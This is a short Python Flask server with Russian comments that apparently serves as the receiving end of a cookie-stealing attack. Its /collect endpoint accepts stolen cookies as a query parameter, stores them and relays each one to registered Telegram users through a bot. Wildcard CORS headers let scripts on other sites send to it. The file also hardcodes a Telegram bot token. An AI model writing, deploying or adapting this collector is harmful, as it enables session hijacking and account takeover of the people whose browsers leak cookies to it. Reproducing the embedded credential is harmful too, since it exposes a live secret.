from flask import Flask, request
import telebot
import os
import time

app = Flask(__name__)

TOKEN = '8693453531:AAFwUMH_otrs4oxV_lGMdokUVKQTjX3mN64'
bot = telebot.TeleBot(TOKEN)

users = set()
cookies = []

# === ЭТОТ БЛОК ДОБАВЛЯЕТ CORS-ЗАГОЛОВКИ ===
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

@app.route('/')
def index():
    return '✅ Бот работает! Отправь /start в Telegram.'

@app.route('/health')
def health():
    return 'OK'

@app.route('/collect')
def collect():
    cookie = request.args.get('cookie')
    if cookie:
        cookies.append(cookie)
        for user_id in list(users):
            try:
                bot.send_message(user_id, f'🍪 Новая кука: {cookie}')
                time.sleep(0.1)
            except:
                pass
        return 'OK'
    return 'No cookie'

@app.route('/register/<int:user_id>')
def register(user_id):
    users.add(user_id)
    return 'Registered'

@app.route('/users')
def users_list():
    return str(list(users))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
